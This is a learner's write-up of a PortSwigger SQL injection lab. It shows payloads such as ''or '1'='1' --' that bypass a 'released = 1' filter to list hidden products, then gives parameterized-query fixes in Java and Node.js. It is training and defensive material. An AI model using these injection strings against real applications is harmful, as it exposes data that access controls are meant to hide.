# Retrieve Hidden Data
## Goal: 
Exploit an unsanitized category parameter in a SQL WHERE 
clause to bypass the `released = 1` filter and retrieve 
products the application intentionally hides from users.

## Lab Details: 
Name: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

Level: Apprentice

Vulnerability Class: SQL Injection

Lab URL: [Lab link](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

Date Completed: 8-May-2026

## What the Lab Is Testing
Tests whether unsanitized user input in a WHERE clause can be manipulated to bypass conditional logic. `release=1`


## The Vulnerable Behavior
The Gifts category filter passes user input directly into a SQL WHERE clause. The app does not sanitize or parameterize the input before executing the query.


## My Approach
### Payloads tried:
| Payload   | Query | Reason| Output |
| -------- | ---------- | ---------- | ---------- |
| 'Gifts'-- |  `SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`| We had to retrieve _ALL_  the products. The above injection is retrieving all the products of _Gifts_ only. | Fail |
|'or '1' = '1' -- | `SELECT * FROM products WHERE category = '' OR '1'='1' --' AND released = 1` | We retirive all the products of all categories | Pass


### Why It Works
```sql 
SELECT * FROM products WHERE category = '' OR 1=1 --' AND released = 1
```

Since 1=1 is always true, it returns all the records in the products table.

## The Fix
Never use string concatenation to build SQL queries
```java
String query = "SELECT * FROM products WHERE category = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setString(1, userInput);
```
NodeJS
```js
const mysql = require('mysql2/promise');
const [rows] = await connection.execute('SELECT * FROM products WHERE category = ?', [category]);   
```

## Real-World Relevance
Legacy PHP and JSP applications frequently use string concatenation in SQL queries. This pattern also appears in poorly configured ORM raw query methods like Spring's JdbcTemplate.queryForList() when used without binding.

Some recent exploits:


## Takeaway
Use parameterized queries or prepared statements. Input sanitization alone is insufficient — attackers can bypass escape logic. Parameterization ensures user input is never interpreted as SQL syntax.